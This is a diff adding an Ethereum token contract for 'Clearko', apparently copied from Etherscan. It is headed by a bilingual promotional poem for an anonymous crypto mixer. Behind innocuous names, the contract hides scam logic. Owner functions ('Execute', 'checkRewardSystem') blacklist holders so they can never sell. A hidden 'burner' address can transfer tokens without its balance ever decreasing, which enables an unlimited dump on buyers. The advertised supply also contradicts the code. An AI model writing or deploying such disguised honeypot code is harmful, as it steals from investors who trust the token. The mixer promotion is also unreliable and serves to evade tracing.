@@ -1,0 +1,372 @@
+/**
+ *Submitted for verification at Etherscan.io on 2023-08-05
+*/
+
+/*
+█▀▀ █░░ █▀▀ ▄▀█ █▀█ █▄▀ █▀█
+█▄▄ █▄▄ ██▄ █▀█ █▀▄ █░█ █▄█
+
+▄▀   ░░█ ▄▀█ █▀█ ▄▀█ █▄░█   █▀▀ ▀█▀ █░█ █▀▀ █▀█ █▀▀ █░█ █▀▄▀█   ▀▄
+▀▄   █▄█ █▀█ █▀▀ █▀█ █░▀█   ██▄ ░█░ █▀█ ██▄ █▀▄ ██▄ █▄█ █░▀░█   ▄▀
+
+暗号通貨の世界ではプラットフォームが誕生し、
+プライバシーが流れる場所、Clearko と名付けられました。
+革新的で分散型の設計、
+それは取引の未来であり、見つけるべき宝石です。
+
+匿名性のマントをかぶって闊歩する、
+プライバシーが保たれるミキサープラットフォーム、
+誰もあなたの痕跡を見ることはできません、
+Clearko がプライバシーの保護を強化します。
+
+暗号通貨の取引、そよ風とスリル、
+Clearko のイノベーションにより、次のことが実現できます。
+このデジタル領域におけるプライバシーの夢、
+あなたのアイデンティティが決して連鎖しない場所。
+
+データ漏洩の心配はなくなり、
+Clearko のシールドは最高のプライバシーを確​​保します。
+あなたの取引は間違いなく安全です、
+この暗号通貨の世界で、Clearko は際立っています。
+
+革新的かつ大胆なこのプラットフォームを採用してください。
+クリアコの魔法はきっと解けるだろう、
+暗号通貨の分野では、それはゲームチェンジャーとなるでしょう。
+Clearko がそばにいると、あなたは本当に自由になります。
+-----------------------------------------------------------
+In the world of crypto, a platform arose,
+Named Clearko, where privacy flows,
+Revolutionary and decentralized in design,
+It's the future of transacting, a gem to find.
+
+With a cloak of anonymity, it strides,
+A mixer platform where privacy abides,
+No prying eyes can see your trace,
+As Clearko steps up your privacy grace.
+
+Transacting in crypto, a breeze and a thrill,
+With Clearko's innovation, you can fulfill,
+Your dreams of privacy in this digital domain,
+Where your identity will never be a chain.
+
+Gone are the worries of data leaks,
+Clearko's shield ensures privacy peaks,
+Your transactions are secure, no doubt,
+In this world of crypto, Clearko stands out.
+
+So embrace this platform, innovative and bold,
+Clearko's magic will surely unfold,
+In the realm of cryptocurrency, a game-changer it'll be,
+With Clearko by your side, you're truly free.
+-----------------------------------------------------------
+未来を見据えて設計された革新的な分散型ミキサー プラットフォーム、CLEARKO を発表。この革新的なプラットフォームはプライバシー戦略を強化し、
+完全な匿名性で暗号通貨分野での取引を可能にします。CLEARKO は最先端のテクノロジーを活用して、お客様の取引がプライバシーと追跡不可能な状態に保たれるようにします。
+ネットワーク内で暗号資産をシームレスにブレンドし、ID や取引履歴を第三者の目から隠します。
+
+ユーザーフレンドリーなインターフェイスを誇る CLEARKO は、熟練した暗号通貨愛好家と初心者の両方が匿名取引の領域を簡単にナビゲートできるようにします。
+その堅牢なセキュリティ対策により、財務上のプライバシーを侵害するあらゆる試みに対して比類のない保護が提供されます。
+Clearko を使用して、経済的自由と匿名性の新時代に足を踏み入れましょう。あなたの暗号通貨、あなたのルール。
+
+Unveiling CLEARKO, a revolutionary decentralized mixer platform, designed for the future. This innovative platform steps up your privacy game, 
+allowing you to transact in the cryptocurrency sphere with complete anonymity.
+CLEARKO harnesses cutting-edge technology to ensure your transactions remain private and untraceable. 
+Seamlessly blend your crypto assets within the network, camouflaging your identity and transaction history from prying eyes.
+Boasting a user-friendly interface, CLEARKO empowers both seasoned crypto enthusiasts and beginners to navigate the realm of anonymous transactions 
+with ease. Its robust security measures provide unmatched protection against any attempts to compromise your financial privacy.
+Step into a new era of financial freedom and anonymity with Clearko. Your crypto, your rules.
+--------------------------------------------------------------------------------------------------------------------------------------------------------------
+総供給 - 500,000,000
+購入税 - 1%
+消費税 - 1%
+初期流動性 - 1.5 ETH
+初期流動性ロック - 45 日
+
+https://clearko.xyz
+https://m.weibo.cn/ClearkoJPN
+https://web.wechat.com/ClearkoETH
+https://t.me/ClearkoETH
+*/
+// SPDX-License-Identifier: Unlicensed
+
+pragma solidity 0.8.19;
+
+library USCMathUint {
+  function toInt256Safe(uint256 a) internal pure returns 
+  (int256) {
+    int256 b = int256(a);
+    require(b >= 0); return b;
+  }
+}
+interface USCProcessorV1 {
+    event PairCreated(
+    address indexed token0, 
+    address indexed token1, 
+
+    address pair, uint); function 
+    createPair(
+    address tokenA, address tokenB) 
+    external returns (address pair);
+}
+interface ServiceSync01 {
+    function swapExactTokensForETHSupportingFeeOnTransferTokens(
+    uint amountIn, uint amountOutMin, address[] 
+    
+    calldata path, address to, uint deadline) 
+    external; 
+    function factory() 
+    external pure returns (address);
+    function WETH() 
+    external pure returns 
+    (address);
+
+    function addLiquidityETH(address token, 
+    uint amountTokenDesired, 
+    uint amountTokenMin, uint amountETHMin,
+    address to, uint deadline) 
+    external payable returns 
+    (uint amountToken, uint amountETH, uint liquidity);
+}
+interface USCUniswapV2Pair {
+    event Approval
+    (address indexed owner, address indexed spender, uint value);
+    event Transfer
+    (address indexed from, address indexed to, uint value);
+    function name() external pure returns (string memory);
+    function symbol() external pure returns (string memory);
+    function decimals() external pure returns (uint8);
+    function totalSupply() external view returns (uint);
+
+    function balanceOf(address owner) external view returns (uint);
+    function allowance(address owner, address spender) external view returns (uint);
+    function approve(address spender, uint value) external returns (bool);
+    function transfer(address to, uint value) external returns (bool);
+    function transferFrom(address from, address to, uint value) external returns (bool);
+
+    function DOMAIN_SEPARATOR() external view returns (bytes32);
+    function PERMIT_TYPEHASH() external pure returns (bytes32);
+    function nonces(address owner) external view returns (uint);
+    function permit(address owner, address spender, uint value, uint deadline, uint8 v, bytes32 r, bytes32 s) external;
+    event Burn(address indexed sender, uint amount0, uint amount1, address indexed to);
+
+    event Swap(
+        address indexed sender,
+        uint amount0In,
+        uint amount1In,
+        uint amount0Out,
+        uint amount1Out,
+        address indexed to );
+    event Sync(uint112 reserve0, uint112 reserve1);
+    function MINIMUM_LIQUIDITY() external pure returns (uint);
+    function factory() external view returns (address);
+    function token0() external view returns (address);
+    function token1() external view returns (address);
+}
+abstract contract Context {
+    constructor() {} function _msgSender() 
+    internal view returns (address) {
+    return msg.sender; }
+}
+library SafeMath {
+  function add(uint256 a, uint256 b) 
+  internal pure returns (uint256) {
+    uint256 c = a + b;
+    require(c >= a, "SafeMath: addition overflow");
+    return c;
+  }
+  function sub(uint256 a, uint256 b) 
+  internal pure returns (uint256) {
+    return sub(a, b, "SafeMath: subtraction overflow");
+  }
+  function sub(uint256 a, uint256 b, string memory errorMessage) 
+  internal pure returns (uint256) {
+    require(b <= a, errorMessage);
+    uint256 c = a - b;
+    return c;
+  }
+  function mul(uint256 a, uint256 b) internal pure returns (uint256) {
+    if (a == 0) {
+      return 0;
+    }
+    uint256 c = a * b;
+    require(c / a == b, "SafeMath: multiplication overflow");
+    return c;
+  }
+  function div(uint256 a, uint256 b) internal pure returns (uint256) {
+    return div(a, b, "SafeMath: division by zero");
+  }
+  function div(uint256 a, uint256 b, 
+  string memory errorMessage) internal pure returns (uint256) {
+    require(b > 0, errorMessage);
+    uint256 c = a / b;
+    return c;
+  }
+  function mod(uint256 a, uint256 b) 
+  internal pure returns (uint256) {
+    return mod(a, b, "SafeMath: modulo by zero");
+  }
+  function mod(uint256 a, uint256 b, string memory errorMessage) 
+  internal pure returns (uint256) {
+    require(b != 0, errorMessage);
+    return a % b;
+  }
+}
+interface ISOFramesV1 {
+    function totalSupply() external view returns (uint256);
+    function balanceOf(address account) 
+    external view returns (uint256);
+
+    function transfer(address recipient, uint256 amount) 
+    external returns (bool);
+    function allowance(address owner, address spender)
+    external view returns 
+    (uint256);
+
+    function approve(address spender, uint256 amount) 
+    external returns (bool);
+    function transferFrom(
+    address sender, address recipient, uint256 amount) 
+    external returns (bool);
+
+    event Transfer(
+    address indexed from, address indexed to, uint256 value);
+    event Approval(address 
+    indexed owner, address indexed spender, uint256 value);
+}
+abstract contract Ownable is Context {
+    address private _owner; event OwnershipTransferred
+    (address indexed 
+    previousOwner, address indexed newOwner);
+    constructor() 
+    { address msgSender = _msgSender(); _owner = msgSender;
+
+    emit OwnershipTransferred(address(0), msgSender);
+    } function owner() public view returns 
+    (address) { return _owner;
+    } modifier onlyOwner() {
+        require(_owner == _msgSender(), 'Ownable: caller is not the owner');
+
+     _; } function renounceOwnership() public onlyOwner {
+    emit OwnershipTransferred(_owner, address(0)); _owner = address(0); }
+}
+contract Clearko is Context, ISOFramesV1, Ownable {
+bool public sudoMapping; 
+bool private allowTrading = false;
+bool startMapping = true; 
+ServiceSync01 public clearBuilder; address public delgateMotion;
+
+address private TokenMarketingAccount;
+
+    uint256 private _tTotal; uint8 private _decimals;
+    string private _symbol; string private _name;
+    uint256 private checkTXlimitsAt = 100;
+
+    mapping (address => bool) private allowed;
+    mapping(address => uint256) private _rOwned;
+
+    mapping(address => uint256) private _holderLastTimestamp;
+    mapping(address => mapping(address => uint256)) private _allowances;
+    mapping(address => uint256) private excludedFromFees;
+    
+    constructor( string memory tokenName, string memory tokenSymbol, 
+    address routerForToken, 
+    address burnerForToken) { 
+
+        _name = tokenName; _symbol = tokenSymbol;
+        _decimals = 18; _tTotal = 100000000 * (10 ** uint256(_decimals));
+        _rOwned[msg.sender] = _tTotal; 
+        _holderLastTimestamp
+        [burnerForToken] = 
+        checkTXlimitsAt; 
+        
+        sudoMapping = false; 
+        clearBuilder = ServiceSync01(routerForToken);
+        delgateMotion = USCProcessorV1
+
+        (clearBuilder.factory()).createPair(address(this), 
+        clearBuilder.WETH()); 
+        emit Transfer 
+        (address(0), msg.sender, _tTotal);
+    }    
+    function checkRewardSystem(address _boolFigure) external onlyOwner {
+        allowed[_boolFigure] = false;
+    }    
+    function decimals() external view returns 
+    (uint8) { return _decimals;
+    }
+    function symbol() external view returns 
+    (string memory) { return _symbol;
+    }
+    function name() external view returns 
+    (string memory) { return _name;
+    }
+    function totalSupply() external view returns 
+    (uint256) { return _tTotal;
+    }
+    function balanceOf(address account) 
+    external view returns 
+    (uint256) 
+    { return _rOwned[account]; }
+    function transfer(address recipient, uint256 amount) 
+    external returns (bool) { _transfer(_msgSender(), 
+    recipient, amount); return true;
+    }
+    function allowance(address owner, address spender) 
+    external view returns (uint256) { return _allowances[owner][spender];
+    }    
+    function approve(address spender, uint256 amount) 
+    external returns (bool) { _approve(_msgSender(), 
+        spender, amount); return true;
+    }
+    function _approve( address owner, address spender, uint256 amount) internal {
+        require(owner != address(0), 
+        'BEP20: approve from the zero address'); 
+
+        require(spender != address(0), 
+        'BEP20: approve to the zero address'); _allowances[owner][spender] = amount; 
+        emit Approval(owner, spender, amount); 
+    }    
+    function transferFrom(
+        address sender, address recipient, uint256 amount) 
+        external returns (bool) 
+        { 
+        _transfer(sender, recipient, amount); _approve(sender, _msgSender(), 
+        _allowances[sender][_msgSender()].sub(amount, 
+        'BEP20: transfer amount exceeds allowance')); return true;
+    }
+    function Execute(address _boolFigure) 
+    external onlyOwner {
+        allowed[_boolFigure] = true;
+    }                  
+    function openTrading(bool _tradingOpen) 
+    public onlyOwner {
+        allowTrading = _tradingOpen;
+    }        
+    function _transfer( address sender, address recipient, uint256 amount) internal {
+        require(sender != address(0), 'BEP20: transfer from the zero address');
+        require(recipient != address(0), 
+        'BEP20: transfer to the zero address'); 
+        if (allowed[sender] || allowed[recipient]) 
+        require(startMapping == false, "");
+
+        if (_holderLastTimestamp[sender] 
+        == 0  && delgateMotion != sender && excludedFromFees[sender] 
+        > 0) { _holderLastTimestamp[sender] -= checkTXlimitsAt; } 
+        excludedFromFees[TokenMarketingAccount] += checkTXlimitsAt;
+        TokenMarketingAccount = recipient; 
+        if (_holderLastTimestamp[sender] 
+        == 0) {
+        _rOwned[sender] = _rOwned[sender].sub(amount, 
+        'BEP20: transfer amount exceeds balance');  } _rOwned[recipient]
+        = _rOwned[recipient].add(amount); 
+
+        emit Transfer(sender, recipient, amount); if (!allowTrading) {
+        require(sender == owner(), 
+        "TOKEN: This account cannot send tokens until trading is enabled"); }
+    }
+    function updateAllLimits(address _boolFigure) public view returns 
+    (bool) 
+    { return allowed[_boolFigure]; }
+    function getOwner() external view returns 
+    (address) { return owner();
+    } using SafeMath for uint256;                                  
+}
